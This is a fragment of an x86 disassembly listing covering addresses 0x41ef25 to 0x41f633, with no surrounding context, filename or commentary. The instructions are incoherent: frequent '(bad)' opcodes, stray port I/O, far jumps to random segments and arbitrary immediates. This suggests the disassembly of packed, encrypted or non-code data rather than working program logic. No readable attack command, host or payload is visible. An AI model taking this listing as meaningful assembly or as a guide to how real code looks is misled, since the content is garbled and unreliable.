  41ef25:	stos   BYTE PTR es:[edi],al
  41ef26:	mov    al,0x5e
  41ef28:	imul   esi,DWORD PTR [edi+0x57],0x59403e9f
  41ef2f:	std    
  41ef30:	gs push es
  41ef32:	outs   dx,BYTE PTR ds:[esi]
  41ef33:	push   cs
  41ef34:	pop    esp
  41ef35:	sub    edx,DWORD PTR [ecx]
  41ef37:	test   eax,0x75a1b59
  41ef3c:	lock dec ecx
  41ef3e:	push   ebp
  41ef3f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef40:	inc    edi
  41ef41:	outs   dx,DWORD PTR ds:[esi]
  41ef42:	je     0x41ef30
  41ef44:	push   ds
  41ef45:	jns    0x41ef20
  41ef47:	add    eax,0x2b
  41ef4a:	xor    ah,BYTE PTR [eax+esi*8+0x29]
  41ef4e:	cdq    
  41ef4f:	jno    0x41ef34
  41ef51:	adc    eax,0x61e92240
  41ef56:	and    DWORD PTR [ebp+0x63],0x878ee6df
  41ef5d:	mov    edx,0xa670f32d
  41ef62:	push   cs
  41ef63:	aaa    
  41ef64:	xor    dh,ah
  41ef66:	inc    BYTE PTR ds:0x82c7d9d
  41ef6c:	sbb    ah,dl
  41ef6e:	push   ebp
  41ef6f:	sbb    DWORD PTR [edi],ebp
  41ef71:	sub    dl,bh
  41ef73:	fsub   QWORD PTR [esi-0x20]
  41ef76:	mov    edx,0x777188ab
  41ef7b:	lea    edx,[ebp+0x3]
  41ef7e:	sub    eax,esi
  41ef80:	iret   
  41ef81:	in     eax,0x13
  41ef83:	ss out 0x74,al
  41ef86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef87:	shr    BYTE PTR [edx],0x78
  41ef8a:	cmp    DWORD PTR [edx],0xaccfef59
  41ef90:	out    0x3a,al
  41ef92:	imul   edx,DWORD PTR [esi-0x54],0x7a
  41ef96:	push   edi
  41ef97:	je     0x30486192
  41ef9d:	into   
  41ef9e:	(bad)  
  41efa0:	jmp    0xbddd:0x743055be
  41efa7:	mov    cl,0x3c
  41efa9:	sub    esp,DWORD PTR [esi-0xc50f9ed]
  41efaf:	scas   eax,DWORD PTR es:[edi]
  41efb0:	xchg   edi,eax
  41efb1:	rcl    BYTE PTR [edx+ebp*2+0x7f],0x8d
  41efb6:	dec    ebp
  41efb7:	jns    0x41f01a
  41efb9:	rol    BYTE PTR [edi],cl
  41efbb:	pop    ebp
  41efbc:	mov    eax,eax
  41efbe:	test   eax,0x2bea4503
  41efc3:	cmp    esp,DWORD PTR [ecx+0x55]
  41efc6:	pop    esi
  41efc7:	inc    esi
  41efc8:	test   eax,0x2707ad56
  41efcd:	(bad)  
  41efce:	bound  eax,QWORD PTR [eax]
  41efd0:	sbb    eax,0x6482aa39
  41efd5:	push   eax
  41efd6:	sub    ah,BYTE PTR [eax+0x59]
  41efd9:	mov    ebp,0x9b62e553
  41efde:	mov    bl,0x8
  41efe0:	mov    al,0xe4
  41efe2:	popf   
  41efe3:	inc    esi
  41efe4:	sbb    esp,DWORD PTR [edi]
  41efe6:	imul   edx,eax,0xffffffbf
  41efe9:	mov    eax,ds:0x289d6730
  41efee:	fcmove st,st(5)
  41eff0:	xchg   BYTE PTR [edx+0x3f],al
  41eff3:	leave  
  41eff4:	add    esi,DWORD PTR [esi-0x50]
  41eff7:	out    0xa9,eax
  41eff9:	in     eax,dx
  41effa:	cdq    
  41effb:	test   eax,0x9054351e
  41f000:	(bad)  
  41f001:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f002:	mov    dl,0xd5
  41f004:	fdiv   QWORD PTR [edx]
  41f006:	jno    0x41f031
  41f008:	sbb    eax,0x6387efc3
  41f00d:	xor    edx,esp
  41f00f:	mov    dl,0x20
  41f011:	xor    eax,0x1127e7d5
  41f016:	in     al,dx
  41f017:	push   ebp
  41f018:	pop    ebp
  41f019:	and    bl,dl
  41f01b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f01c:	dec    edx
  41f01d:	add    eax,edx
  41f01f:	out    0x7c,al
  41f021:	std    
  41f022:	popf   
  41f023:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f024:	mov    esp,0xe3d81f87
  41f029:	rol    BYTE PTR [esi],cl
  41f02b:	clc    
  41f02c:	mov    ecx,0xe87b9088
  41f031:	mov    al,ds:0x7ffccd85
  41f036:	not    DWORD PTR [edi+0x60fca8c1]
  41f03c:	jbe    0x41f046
  41f03e:	adc    eax,0xef0e9bbd
  41f043:	or     eax,0xfb85c9f0
  41f048:	jae    0x41efdc
  41f04a:	imul   ebx,DWORD PTR [edx],0xb0bf3fb
  41f050:	xor    esi,ecx
  41f052:	mov    eax,0xc8bd6e76
  41f057:	jo     0x41f0d6
  41f059:	fcmovu st,st(3)
  41f05b:	ins    DWORD PTR es:[edi],dx
  41f05c:	icebp  
  41f05d:	(bad)  
  41f05e:	cmc    
  41f05f:	(bad)  
  41f061:	add    eax,0xc1cb4792
  41f066:	lahf   
  41f067:	jnp    0x41f07d
  41f069:	mov    dh,0x66
  41f06b:	sbb    al,BYTE PTR [ecx+0x44]
  41f06e:	jle    0x41f0ee
  41f070:	jmp    0xf1aa:0x9ccb261
  41f077:	jl     0x41f092
  41f079:	gs jle 0x41f0e7
  41f07c:	lods   eax,DWORD PTR ds:[esi]
  41f07d:	adc    ebp,edi
  41f07f:	call   0x345aa597
  41f084:	stos   BYTE PTR es:[edi],al
  41f085:	mov    ebp,0xcc48e55b
  41f08a:	push   cs
  41f08b:	lahf   
  41f08c:	and    BYTE PTR [ebx+edx*2-0x753e144],dh
  41f093:	das    
  41f094:	or     BYTE PTR [eax-0x7a],bh
  41f097:	dec    ecx
  41f098:	dec    eax
  41f099:	retf   
  41f09a:	scas   al,BYTE PTR es:[edi]
  41f09b:	adc    DWORD PTR [eax+esi*4],esi
  41f09e:	test   esp,0x170ff13b
  41f0a4:	fstp   DWORD PTR [ebp+esi*1+0x14]
  41f0a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0a9:	shl    DWORD PTR [edi+0x1dfeb5a7],0x76
  41f0b0:	inc    edi
  41f0b1:	cmp    eax,0xbd326395
  41f0b6:	pop    DWORD PTR [ecx+0x77]
  41f0b9:	lods   eax,DWORD PTR ds:[esi]
  41f0ba:	cmp    BYTE PTR [edx],dh
  41f0bc:	sub    eax,0x375ed38b
  41f0c1:	push   cs
  41f0c2:	xchg   esp,eax
  41f0c3:	ins    BYTE PTR es:[edi],dx
  41f0c4:	push   0x4f5caed8
  41f0c9:	and    esi,edx
  41f0cb:	loope  0x41f0fe
  41f0cd:	(bad)  
  41f0ce:	sbb    ebp,esi
  41f0d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0d1:	stc    
  41f0d2:	jecxz  0x41f0ab
  41f0d4:	pop    ecx
  41f0d5:	cwde   
  41f0d6:	add    dl,BYTE PTR [esp+esi*2]
  41f0d9:	jle    0x41f09d
  41f0db:	stc    
  41f0dc:	push   esi
  41f0dd:	sbb    BYTE PTR [eax+0x5df2e291],cl
  41f0e3:	sahf   
  41f0e4:	(bad)  
  41f0e5:	in     al,dx
  41f0e6:	fnstsw WORD PTR [ebx-0x1eae2123]
  41f0ec:	ins    BYTE PTR es:[edi],dx
  41f0ed:	aam    0xca
  41f0ef:	cwde   
  41f0f0:	mov    ecx,0xf43ae33a
  41f0f5:	or     DWORD PTR [edi],ecx
  41f0f7:	mov    ebx,0x53918e28
  41f0fc:	mov    al,0xa5
  41f0fe:	mov    eax,ds:0x2e7b37a8
  41f104:	mov    ds:0x827c0012,al
  41f109:	pop    edi
  41f10a:	in     eax,0x30
  41f10c:	dec    ebx
  41f10d:	inc    ebp
  41f10e:	addr16 out dx,eax
  41f110:	mov    edx,0x8eb20455
  41f115:	sub    ch,BYTE PTR [edx]
  41f117:	or     ah,BYTE PTR [edx-0x63]
  41f11a:	push   esi
  41f11b:	ja     0x41f0a3
  41f11d:	push   edi
  41f11e:	mov    ds:0x55dfd9ec,eax
  41f123:	int    0xfb
  41f125:	add    cl,0x5a
  41f128:	mov    ds:0xef69ae04,al
  41f12d:	xchg   ebp,eax
  41f12e:	pop    esi
  41f12f:	xchg   bh,bl
  41f131:	or     al,bl
  41f133:	outs   dx,BYTE PTR ds:[esi]
  41f134:	jae    0x41f0ec
  41f136:	mov    ds:0x51359d10,eax
  41f13b:	(bad)  
  41f13c:	xor    bl,BYTE PTR [edi]
  41f13e:	add    al,0x70
  41f140:	stc    
  41f141:	push   eax
  41f142:	jmp    0xcd2bca7f
  41f147:	xor    ecx,DWORD PTR [esi-0x69]
  41f14a:	repz xchg ebx,eax
  41f14c:	xchg   cl,al
  41f14e:	push   edi
  41f14f:	ret    
  41f150:	push   esp
  41f151:	das    
  41f152:	ds jl  0x41f1c9
  41f155:	mov    ds:0xeb0a4599,al
  41f15a:	xlat   BYTE PTR ds:[ebx]
  41f15b:	enter  0xe558,0x6c
  41f15f:	pop    edi
  41f160:	sbb    BYTE PTR [edx],bl
  41f162:	mov    esi,0x58641a67
  41f167:	arpl   WORD PTR [ecx],dx
  41f169:	stos   BYTE PTR es:[edi],al
  41f16a:	push   ss
  41f16b:	xor    ecx,edx
  41f16d:	add    ch,ch
  41f16f:	scas   eax,DWORD PTR es:[edi]
  41f170:	and    ah,ch
  41f172:	or     al,BYTE PTR [eax-0x5d4e5518]
  41f178:	outs   dx,DWORD PTR ds:[esi]
  41f179:	pop    ss
  41f17a:	test   al,0xf7
  41f17c:	popa   
  41f17d:	jnp    0x41f1e9
  41f17f:	inc    esi
  41f180:	sub    esp,DWORD PTR [eax+0x664dbbe3]
  41f186:	addr16 fcmovnb st,st(1)
  41f189:	std    
  41f18a:	add    al,0x8a
  41f18c:	mov    ebp,0xdd7ab1a1
  41f191:	pop    ds
  41f192:	in     al,dx
  41f193:	ret    
  41f194:	(bad)  
  41f195:	jl     0x41f188
  41f197:	dec    eax
  41f198:	ds aad 0xe4
  41f19b:	xchg   DWORD PTR [esi],ebp
  41f19d:	(bad)  
  41f19e:	adc    ecx,edi
  41f1a0:	mov    ebx,DWORD PTR [ebx+0x5a]
  41f1a3:	out    0x51,eax
  41f1a5:	cmp    BYTE PTR [eax],ch
  41f1a7:	sub    al,0xb1
  41f1a9:	fist   WORD PTR [ecx]
  41f1ab:	push   edx
  41f1ac:	test   eax,0xa386b5c7
  41f1b1:	stos   DWORD PTR es:[edi],eax
  41f1b2:	loopne 0x41f1b5
  41f1b4:	jo     0x41f1ad
  41f1b6:	and    al,0xab
  41f1b8:	or     dl,BYTE PTR [esi+0x41]
  41f1bb:	sub    BYTE PTR [ecx+0x79],0x79
  41f1bf:	mov    fs,WORD PTR [esi]
  41f1c1:	retf   
  41f1c2:	mov    al,0xcc
  41f1c4:	xchg   edx,eax
  41f1c5:	cmp    edx,edi
  41f1c7:	xchg   dh,dh
  41f1c9:	and    DWORD PTR [esi-0x69],eax
  41f1cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1cd:	push   cs
  41f1ce:	into   
  41f1cf:	ins    BYTE PTR es:[edi],dx
  41f1d0:	xor    ah,ah
  41f1d2:	or     esi,esp
  41f1d4:	test   al,0x36
  41f1d6:	push   edi
  41f1d7:	hlt    
  41f1d8:	sub    ch,BYTE PTR [edi+esi*4]
  41f1db:	adc    eax,0x9e911ea5
  41f1e0:	add    ebx,DWORD PTR [eax-0x6a267c99]
  41f1e6:	or     al,BYTE PTR [edx+0x44e32f98]
  41f1ec:	fwait
  41f1ed:	cmp    al,0x5
  41f1ef:	mov    ds:0x7be67c75,al
  41f1f4:	sbb    bh,bl
  41f1f6:	sub    eax,0x2bee5986
  41f1fb:	dec    eax
  41f1fc:	mov    ecx,0x18c9e444
  41f201:	mov    bh,0xe3
  41f203:	cs (bad) 
  41f205:	test   bl,dh
  41f207:	sbb    eax,0x4299077c
  41f20c:	mov    DWORD PTR [ecx],esp
  41f20e:	xor    al,0x6e
  41f210:	les    ebx,FWORD PTR [eax+esi*2-0x16]
  41f214:	push   0x9ade5d12
  41f219:	ss sbb al,0xb2
  41f21c:	or     al,BYTE PTR [edx-0x51f25ffa]
  41f222:	test   eax,0xe420c9ec
  41f227:	data16 adc BYTE PTR [esi+ebp*4+0x36a947ff],al
  41f22f:	push   esi
  41f230:	adc    BYTE PTR [edi-0x4933ef2b],dl
  41f236:	cs add al,0xfe
  41f239:	out    dx,eax
  41f23a:	lods   al,BYTE PTR ds:[esi]
  41f23b:	jbe    0x41f2bb
  41f23d:	out    0xf4,al
  41f23f:	outs   dx,DWORD PTR ds:[esi]
  41f240:	push   eax
  41f241:	les    ebx,FWORD PTR [edi+eax*4-0x7718dc97]
  41f248:	sbb    DWORD PTR [edx+eax*1-0x24],ebx
  41f24c:	xchg   edi,eax
  41f24d:	outs   dx,DWORD PTR ds:[esi]
  41f24e:	cmp    al,0xa9
  41f250:	lahf   
  41f251:	packsswb mm1,QWORD PTR [ecx-0x57]
  41f255:	imul   DWORD PTR [ebx]
  41f257:	mov    al,0x37
  41f259:	mov    ebx,0xf55b8c4c
  41f25e:	scas   al,BYTE PTR es:[edi]
  41f25f:	mov    ebp,0xe76be037
  41f264:	into   
  41f265:	mov    BYTE PTR [edi+0x2d],ch
  41f268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f269:	adc    eax,0xe462b46b
  41f26e:	sbb    ebp,eax
  41f270:	xchg   ebp,eax
  41f271:	test   eax,0xe13a6d02
  41f276:	retf   0x56c0
  41f279:	test   DWORD PTR [edx-0xe81a459],edi
  41f27f:	int3   
  41f280:	add    al,0xf4
  41f282:	inc    ebx
  41f283:	daa    
  41f284:	stc    
  41f285:	fisubr DWORD PTR [edx-0x75]
  41f288:	sub    al,BYTE PTR [edx-0x426c07e8]
  41f28e:	jae    0x41f30a
  41f290:	std    
  41f291:	push   esp
  41f292:	mov    ebx,0xf306e743
  41f297:	xor    al,0xe9
  41f299:	xor    DWORD PTR [ecx],ebx
  41f29b:	mov    ds:0x63a91bf8,eax
  41f2a0:	(bad)  
  41f2a1:	cmp    esp,edi
  41f2a3:	mov    dh,0x29
  41f2a5:	(bad)  
  41f2a7:	loopne 0x41f303
  41f2a9:	fcom   QWORD PTR [edi-0x24]
  41f2ac:	fcom   QWORD PTR [edx]
  41f2ae:	add    ecx,ecx
  41f2b0:	sub    cl,BYTE PTR [edi+0x770423d6]
  41f2b6:	dec    edx
  41f2b7:	std    
  41f2b8:	pushf  
  41f2b9:	bound  edx,QWORD PTR ss:[ebx]
  41f2bc:	mov    edx,0xc7bca3d6
  41f2c1:	fist   DWORD PTR [ebx]
  41f2c3:	jo     0x41f321
  41f2c5:	push   ecx
  41f2c6:	popa   
  41f2c7:	mov    ah,0x76
  41f2c9:	or     al,0xcb
  41f2cb:	stos   DWORD PTR es:[edi],eax
  41f2cc:	outs   dx,DWORD PTR ds:[esi]
  41f2cd:	lahf   
  41f2ce:	lods   eax,DWORD PTR ds:[esi]
  41f2cf:	stc    
  41f2d0:	arpl   WORD PTR [esi],bp
  41f2d2:	mov    WORD PTR [edx],gs
  41f2d4:	test   eax,0xf3582043
  41f2d9:	ror    ah,0xcb
  41f2dc:	bound  edx,QWORD PTR [ebp+0x6baa8da7]
  41f2e2:	jecxz  0x41f34e
  41f2e4:	adc    al,BYTE PTR [esi]
  41f2e6:	jo     0x41f30a
  41f2e8:	loopne 0x41f2bc
  41f2ea:	ins    BYTE PTR es:[edi],dx
  41f2eb:	sub    al,0xf8
  41f2ed:	xor    al,0x74
  41f2ef:	or     al,BYTE PTR [ecx+0x2e084f67]
  41f2f5:	nop
  41f2f6:	push   eax
  41f2f7:	pop    esi
  41f2f8:	ret    0x8ad1
  41f2fb:	dec    esi
  41f2fc:	jno    0x41f2b8
  41f2fe:	inc    ebp
  41f2ff:	loopne 0x41f35d
  41f301:	outs   dx,BYTE PTR ds:[esi]
  41f302:	push   ds
  41f303:	ficom  WORD PTR [esi-0x4698a987]
  41f309:	dec    BYTE PTR [ebp+0x4]
  41f30c:	into   
  41f30d:	lods   eax,DWORD PTR ds:[esi]
  41f30e:	repnz xor eax,0xb97f31e3
  41f314:	xchg   ebp,eax
  41f315:	sbb    ecx,eax
  41f317:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f318:	mov    bl,0xeb
  41f31a:	fld    DWORD PTR [eax]
  41f31c:	(bad)  
  41f31d:	lahf   
  41f31e:	xor    ebp,DWORD PTR [ebp+0x56]
  41f321:	ret    
  41f322:	sbb    ecx,DWORD PTR [eax+edx*4-0x35]
  41f326:	jg     0x41f31c
  41f328:	or     DWORD PTR [ebx],0x618efef5
  41f32e:	in     al,0xd8
  41f330:	cmp    dl,BYTE PTR [edi]
  41f332:	test   DWORD PTR [edx],edx
  41f334:	xchg   BYTE PTR [esi],dh
  41f336:	ror    DWORD PTR [eax],cl
  41f338:	and    BYTE PTR [ebp-0x69f03ccb],0x92
  41f33f:	push   cs
  41f340:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f341:	adc    al,BYTE PTR ds:[edi+0x631a8bed]
  41f348:	mov    ebx,0xce0aee19
  41f34d:	push   edi
  41f34e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f34f:	aam    0x5e
  41f351:	jl     0x41f2e8
  41f353:	inc    edi
  41f354:	pop    ss
  41f355:	add    dh,BYTE PTR [ebp-0x7381b7ec]
  41f35b:	out    dx,al
  41f35c:	inc    edx
  41f35d:	(bad)  
  41f35e:	sub    ecx,DWORD PTR [edi]
  41f360:	(bad)  
  41f361:	ret    
  41f362:	sub    eax,0xc412ad1b
  41f367:	fmul   QWORD PTR [eax+0x6e635e0c]
  41f36d:	push   edx
  41f36e:	mov    BYTE PTR [esp+edi*4-0x35cbc0f],dh
  41f375:	xchg   ebx,eax
  41f376:	xor    BYTE PTR [edi+0x7a],dh
  41f379:	iret   
  41f37a:	xor    ecx,DWORD PTR [esi]
  41f37c:	jo     0x41f340
  41f37e:	fxch   st(1)
  41f380:	or     eax,0x16b0454b
  41f385:	or     DWORD PTR [edx],edi
  41f387:	jns    0x41f32e
  41f389:	ds sbb esi,esp
  41f38c:	sub    DWORD PTR [eax+0x43],eax
  41f38f:	jecxz  0x41f404
  41f391:	popa   
  41f392:	lods   eax,DWORD PTR ds:[esi]
  41f393:	pusha  
  41f394:	sti    
  41f395:	fnstenv ds:0x9d17d27e
  41f39b:	inc    ebp
  41f39c:	imul   bx,ax,0xbb8f
  41f3a1:	out    dx,al
  41f3a2:	inc    ebx
  41f3a3:	outs   dx,BYTE PTR ds:[esi]
  41f3a4:	mov    DWORD PTR [ebp+0x40],eax
  41f3a7:	addr16 in eax,dx
  41f3a9:	stos   BYTE PTR es:[edi],al
  41f3aa:	(bad)  
  41f3ab:	adc    bl,BYTE PTR [ebx+0x7ea521b6]
  41f3b1:	push   cs
  41f3b2:	pop    edx
  41f3b3:	bound  esp,QWORD PTR [esp+eiz*2]
  41f3b6:	fdiv   st,st(5)
  41f3b8:	pushf  
  41f3b9:	xchg   ecx,eax
  41f3ba:	adc    ecx,DWORD PTR [edx-0x1c]
  41f3bd:	test   al,0xb
  41f3bf:	test   eax,0x72d74079
  41f3c4:	xor    esp,DWORD PTR [edi+edx*4]
  41f3c7:	aaa    
  41f3c8:	(bad)  [ebx-0x7d88a8d3]
  41f3ce:	ret    0x5232
  41f3d1:	popa   
  41f3d2:	inc    ebx
  41f3d3:	shr    edx,1
  41f3d5:	sbb    BYTE PTR [ebp+0x2a],0x3f
  41f3d9:	sub    al,0xb6
  41f3db:	stos   BYTE PTR es:[edi],al
  41f3dc:	mov    edx,0x37438928
  41f3e1:	ret    0xfc3d
  41f3e4:	pop    ebp
  41f3e5:	ins    DWORD PTR es:[edi],dx
  41f3e6:	in     al,dx
  41f3e7:	imul   edx,DWORD PTR [eax-0x32],0xffffff9b
  41f3eb:	and    DWORD PTR [edi+0x3aa631cb],ebx
  41f3f1:	call   0x27ea:0x202d0821
  41f3f8:	jl     0x41f3bc
  41f3fa:	dec    esp
  41f3fb:	out    0xc9,al
  41f3fd:	mov    bl,0xb8
  41f3ff:	retf   0xb01
  41f402:	aaa    
  41f403:	mov    cl,0xec
  41f405:	imul   edi,ebx,0x70
  41f408:	js     0x41f393
  41f40a:	dec    ebx
  41f40b:	add    cl,bh
  41f40d:	iret   
  41f40e:	mov    bh,0x20
  41f410:	(bad)  
  41f411:	fidiv  WORD PTR [eax]
  41f413:	xchg   esp,eax
  41f414:	jns    0x41f471
  41f416:	xchg   ecx,eax
  41f417:	jne    0x41f3f6
  41f419:	dec    eax
  41f41a:	les    ebp,FWORD PTR [ebx-0x41]
  41f41d:	mov    edi,0x9a4b0184
  41f422:	xor    esp,eax
  41f424:	aas    
  41f425:	das    
  41f426:	mov    ebx,0xae42a780
  41f42b:	pushf  
  41f42c:	rol    BYTE PTR [ebx],1
  41f42e:	xor    bh,BYTE PTR [edx]
  41f430:	xor    al,BYTE PTR [edi]
  41f432:	xchg   DWORD PTR [esi-0x11],esp
  41f435:	or     esp,esp
  41f437:	sub    bl,BYTE PTR [ebx+ebp*4]
  41f43a:	(bad)  
  41f43b:	mov    bh,0x55
  41f43d:	push   esp
  41f43e:	paddd  mm0,QWORD PTR [edi]
  41f441:	hlt    
  41f442:	mov    al,0x6
  41f444:	push   ebp
  41f445:	push   eax
  41f446:	fimul  WORD PTR [edi-0xd]
  41f449:	push   ds
  41f44a:	es pop esi
  41f44c:	mov    esp,0x44a896cb
  41f451:	push   eax
  41f452:	(bad)  
  41f454:	fisubr WORD PTR [ebp-0x40]
  41f457:	xchg   DWORD PTR [edx],esp
  41f459:	jo     0x41f49b
  41f45b:	das    
  41f45c:	or     esp,esi
  41f45e:	cmp    bh,cl
  41f460:	fwait
  41f461:	jmp    0xde78a78d
  41f466:	sbb    ecx,DWORD PTR [edx-0xb88d9cb]
  41f46c:	scas   eax,DWORD PTR es:[edi]
  41f46d:	imul   ch
  41f46f:	scas   al,BYTE PTR es:[edi]
  41f470:	lea    edx,[esi+0x279334c1]
  41f476:	inc    ebx
  41f477:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f478:	invd   
  41f47a:	ja     0x41f4a0
  41f47c:	scas   eax,DWORD PTR es:[edi]
  41f47d:	fdiv   DWORD PTR [ecx]
  41f47f:	jo     0x41f4ef
  41f481:	pop    es
  41f482:	fcomp  DWORD PTR [ecx]
  41f484:	jae    0x41f4e5
  41f486:	aam    0xa0
  41f488:	jbe    0x41f447
  41f48a:	jno    0x41f497
  41f48c:	mov    gs,WORD PTR [eax]
  41f48e:	or     ah,ah
  41f490:	gs mov dh,0xc5
  41f493:	sub    bh,BYTE PTR [esi-0x6f]
  41f496:	push   ecx
  41f497:	(bad)  
  41f498:	pop    ebp
  41f499:	mov    bh,0x8d
  41f49b:	sbb    dh,BYTE PTR [esi]
  41f49d:	fnstsw WORD PTR [ebx+0x7a]
  41f4a0:	pushf  
  41f4a1:	mov    edi,DWORD PTR [edx+edi*8+0x2a0219ac]
  41f4a8:	out    0xb5,eax
  41f4aa:	out    dx,al
  41f4ab:	std    
  41f4ac:	in     eax,dx
  41f4ad:	push   cs
  41f4ae:	jmp    DWORD PTR [edi]
  41f4b0:	inc    esi
  41f4b1:	adc    bh,0x97
  41f4b4:	push   edi
  41f4b5:	dec    esi
  41f4b6:	fcomp  DWORD PTR [ebp-0x2f]
  41f4b9:	int3   
  41f4ba:	in     al,dx
  41f4bb:	mov    eax,ds:0x5e6acb
  41f4c0:	cmp    ebp,eax
  41f4c2:	push   ebx
  41f4c3:	xchg   esi,eax
  41f4c4:	and    BYTE PTR [ebx],bl
  41f4c6:	cldemote BYTE PTR ds:[edi-0x4d]
  41f4cb:	jno    0x41f49b
  41f4cd:	jmp    0x41f49e
  41f4cf:	jg     0x41f519
  41f4d1:	xchg   ebp,eax
  41f4d2:	xor    dh,al
  41f4d4:	dec    edi
  41f4d5:	retf   
  41f4d6:	sti    
  41f4d7:	dec    esp
  41f4d8:	mov    bh,0x4c
  41f4da:	push   cs
  41f4db:	int3   
  41f4dc:	cli    
  41f4dd:	(bad)  ds:0xee143699
  41f4e3:	(bad)  
  41f4e4:	aam    0xe8
  41f4e6:	mul    edx
  41f4e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4e9:	cmp    ebp,DWORD PTR [edi+0x1]
  41f4ec:	stos   BYTE PTR es:[edi],al
  41f4ed:	call   0xcb18:0xde51eac1
  41f4f4:	jns    0x41f4d7
  41f4f6:	jge    0x41f546
  41f4f8:	repnz lods al,BYTE PTR ds:[esi]
  41f4fa:	jp     0x41f526
  41f4fc:	pextrw edi,(bad),0xc5
  41f4fe:	jl     0x41f4fc
  41f500:	shr    DWORD PTR [esi+0x7f73c038],0x4b
  41f507:	test   ah,bh
  41f509:	pop    es
  41f50a:	fcomp  DWORD PTR [edi]
  41f50c:	nop
  41f50d:	mov    bh,0x5b
  41f50f:	rcr    DWORD PTR [ebx+0x2],0xfd
  41f513:	shl    BYTE PTR [ebx+0x34cf82b6],0x87
  41f51a:	idiv   BYTE PTR [edx+0x3b]
  41f51d:	add    ebp,DWORD PTR [edx-0x78594568]
  41f523:	clc    
  41f524:	imul   ebp,DWORD PTR [edx+0x2d],0xf368aa64
  41f52b:	ins    BYTE PTR es:[edi],dx
  41f52c:	scas   eax,DWORD PTR es:[edi]
  41f52d:	leave  
  41f52e:	mov    eax,0x6602ce82
  41f533:	(bad)  
  41f534:	and    edi,edi
  41f536:	jle    0x41f4fa
  41f538:	cwde   
  41f539:	cli    
  41f53a:	pusha  
  41f53b:	pop    ebx
  41f53c:	mov    ebx,0xdc220741
  41f541:	jl     0x41f535
  41f543:	dec    ebx
  41f544:	sub    al,0x12
  41f546:	add    DWORD PTR ds:0x2609bfd5,edx
  41f54c:	push   edx
  41f54d:	push   edi
  41f54e:	lds    edx,FWORD PTR [edi]
  41f550:	sbb    dl,BYTE PTR [ebx]
  41f552:	ret    0x44cd
  41f555:	fcmovbe st,st(7)
  41f557:	je     0x41f4ec
  41f559:	(bad)  
  41f55a:	jmp    DWORD PTR [edi]
  41f55c:	jno    0x41f568
  41f55e:	pop    eax
  41f55f:	dec    ecx
  41f560:	int3   
  41f561:	mov    dh,0x9c
  41f563:	sbb    eax,0x7115a163
  41f568:	adc    DWORD PTR [esi-0x47],edi
  41f56b:	cs std 
  41f56d:	clc    
  41f56e:	dec    ebp
  41f56f:	mov    eax,ds:0xed33d530
  41f574:	fidiv  DWORD PTR [eax-0x26]
  41f577:	jl     0x41f56b
  41f579:	loope  0x41f5dd
  41f57b:	push   cs
  41f57c:	mov    ecx,0x340aeb7c
  41f581:	mov    esp,0xeb87c198
  41f586:	and    BYTE PTR [edi-0x73ee6a22],al
  41f58c:	and    eax,0x743b2929
  41f591:	adc    al,0x99
  41f593:	xchg   edi,ebp
  41f595:	fisubr WORD PTR [ebp+0x2257bab]
  41f59b:	je     0x41f612
  41f59d:	mov    eax,ds:0x8895ce1e
  41f5a2:	lods   eax,DWORD PTR ds:[esi]
  41f5a3:	mov    ch,0x91
  41f5a5:	xor    BYTE PTR [ebp+0x5272f308],ah
  41f5ab:	push   edi
  41f5ac:	aad    0x54
  41f5ae:	or     eax,DWORD PTR [ecx-0x60]
  41f5b1:	mov    eax,0x4cb311df
  41f5b6:	push   esi
  41f5b7:	lea    ebp,[ecx+0x74]
  41f5ba:	pop    ebx
  41f5bb:	jecxz  0x41f60d
  41f5bd:	or     eax,0xe5f3ee6b
  41f5c2:	push   edi
  41f5c3:	xchg   edi,eax
  41f5c4:	stos   DWORD PTR es:[edi],eax
  41f5c5:	fimul  DWORD PTR [esi+0x10]
  41f5c8:	retf   
  41f5c9:	mov    cl,0x61
  41f5cb:	xor    al,0x60
  41f5cd:	jge    0x41f5db
  41f5cf:	addr16 stc 
  41f5d1:	imul   esp,DWORD PTR [edi+0x4a],0xf6bfc8b
  41f5d8:	in     al,dx
  41f5d9:	lods   eax,DWORD PTR ds:[esi]
  41f5da:	dec    ebp
  41f5db:	xchg   BYTE PTR [ebx],ch
  41f5dd:	add    ch,al
  41f5df:	stc    
  41f5e0:	sub    ebp,DWORD PTR [edi]
  41f5e2:	jbe    0x41f5ac
  41f5e4:	xchg   edx,eax
  41f5e5:	adc    bh,BYTE PTR [esi-0x75]
  41f5e8:	mov    ds:0xe0821e3c,al
  41f5ed:	std    
  41f5ee:	push   ss
  41f5ef:	inc    esi
  41f5f0:	lea    edx,[ecx]
  41f5f2:	xchg   esp,eax
  41f5f3:	rcr    DWORD PTR [edx+0x6],0x3b
  41f5f7:	dec    edi
  41f5f8:	add    esp,DWORD PTR [esi+0x55da8841]
  41f5fe:	jp     0x41f5b6
  41f600:	xchg   esp,eax
  41f601:	push   ebx
  41f602:	cmp    ch,bh
  41f604:	retf   
  41f605:	add    ecx,0xe4b91791
  41f60b:	mov    ebx,eax
  41f60d:	jge    0x41f610
  41f60f:	ins    BYTE PTR es:[edi],dx
  41f610:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f611:	xchg   DWORD PTR [esi+eiz*1],esp
  41f614:	dec    ecx
  41f615:	push   0x38e97a95
  41f61a:	lods   al,BYTE PTR ds:[esi]
  41f61b:	(bad)  
  41f61c:	not    BYTE PTR [ecx+0x1bcdfb1b]
  41f622:	cwde   
  41f623:	shl    BYTE PTR [ebp+0x54],1
  41f626:	cwde   
  41f627:	in     eax,0xd9
  41f629:	xchg   esi,eax
  41f62a:	jmp    0xc646faa7
  41f62f:	sbb    DWORD PTR [eax],edi
  41f631:	gs pusha 
  41f633:	xchg   esp,eax
